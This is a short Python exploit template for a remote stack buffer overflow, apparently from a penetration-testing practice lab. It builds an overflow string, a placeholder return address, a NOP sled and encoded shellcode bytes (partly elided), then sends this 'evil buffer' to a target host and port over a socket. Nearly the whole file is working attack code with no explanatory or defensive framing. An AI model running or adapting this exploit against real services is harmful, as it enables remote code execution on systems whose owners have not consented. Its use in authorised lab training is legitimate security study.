#!/usr/bin/env python3

import socket

# CHANGE this
ip = "<ip>"

# CHANGE this
port = <port>

# CHANGE this
prefix = "<OVERFLOWX >"

# CHANGE this
offset = <0>

overflow = "A" * offset
retn = "<endian_chars>"
padding = "\x90" * 16

# CHANGE this
payload = ("\xb8\x5b\x58\x4d\x48\xda\xd3\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
...
"\x37\x12\x2d\x21\x38\x37")

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")